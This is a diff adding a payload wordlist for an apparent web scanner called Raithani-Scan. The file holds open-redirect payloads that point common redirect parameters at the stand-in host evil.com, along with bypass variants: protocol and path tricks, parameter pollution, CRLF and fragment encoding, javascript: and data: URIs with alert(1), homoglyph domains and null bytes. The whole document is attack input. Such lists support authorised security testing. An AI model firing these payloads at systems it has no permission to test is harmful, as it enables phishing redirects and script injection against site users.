@@ -1,0 +1,111 @@
+# Open Redirect Payloads - Raithani-Scan
+# ========================================
+# Standard URL parameters
+?url=http://evil.com
+?url=https://evil.com
+?url=//evil.com
+?url=http://evil.com/?
+?url=//evil.com/
+?url=////evil.com
+?redirect=http://evil.com
+?redirect=https://evil.com
+?redirect=//evil.com
+?redirect_uri=http://evil.com
+?redirect_uri=https://evil.com
+?redirect_uri=//evil.com
+?redirect_url=http://evil.com
+?redirect_url=https://evil.com
+?redirect_url=//evil.com
+?next=http://evil.com
+?next=https://evil.com
+?next=//evil.com
+?next_url=http://evil.com
+?next_url=https://evil.com
+?next_url=//evil.com
+?return=http://evil.com
+?return=https://evil.com
+?return=//evil.com
+?return_to=http://evil.com
+?return_to=https://evil.com
+?return_to=//evil.com
+?return_url=http://evil.com
+?return_url=https://evil.com
+?return_url=//evil.com
+?r=http://evil.com
+?r=https://evil.com
+?r=//evil.com
+?target=http://evil.com
+?target=https://evil.com
+?target=//evil.com
+?dest=http://evil.com
+?dest=https://evil.com
+?dest=//evil.com
+?destination=http://evil.com
+?destination=https://evil.com
+?destination=//evil.com
+?out=http://evil.com
+?out=https://evil.com
+?out=//evil.com
+?view=http://evil.com
+?view=https://evil.com
+?view=//evil.com
+?path=http://evil.com
+?path=https://evil.com
+?path=//evil.com
+?continue=http://evil.com
+?continue=https://evil.com
+?continue=//evil.com
+?referer=http://evil.com
+?referrer=http://evil.com
+?callback=http://evil.com
+?callback=https://evil.com
+?callback=//evil.com
+?data=http://evil.com
+?data=https://evil.com
+?data=//evil.com
+
+# Protocol bypass
+?url=//google.com@evil.com
+?url=//evil.com?url=google.com
+?url=\\evil.com
+?url=https:evil.com
+?url=http:evil.com
+?url=///evil.com
+?url=////evil.com
+
+# Path based bypass
+?url=//evil.com/..
+?url=//evil.com/../
+?url=//evil.com/../..
+?url=evil.com
+?url=.evil.com
+?url=%2Feval.com
+?url=%40evil.com
+
+# Double parameter pollution
+?url=http://evil.com&url=http://good.com
+?redirect=http://evil.com&redirect=http://good.com
+?next=http://evil.com&next=http://good.com
+
+# Fragment based
+?url=http://evil.com#
+?url=http://evil.com%23
+?url=http://evil.com%23@good.com
+?url=http://evil.com%0d%0a
+
+# JavaScript URI
+?url=javascript:alert(1)
+?url=javascript:void(0)
+?url=data:text/html,<script>alert(1)</script>
+
+# Unicode bypass
+?url=http://evil.com
+?url=http://еvil.com (Cyrillic 'е')
+?url=http://xn--e1vjl.com (punycode evil)
+?url=http://evil.com
+
+# Misc
+?url=/\/evil.com
+?url=//evil%00.com
+?url=../..././..././evil.com
+?url=http://127.0.0.1%00@evil.com
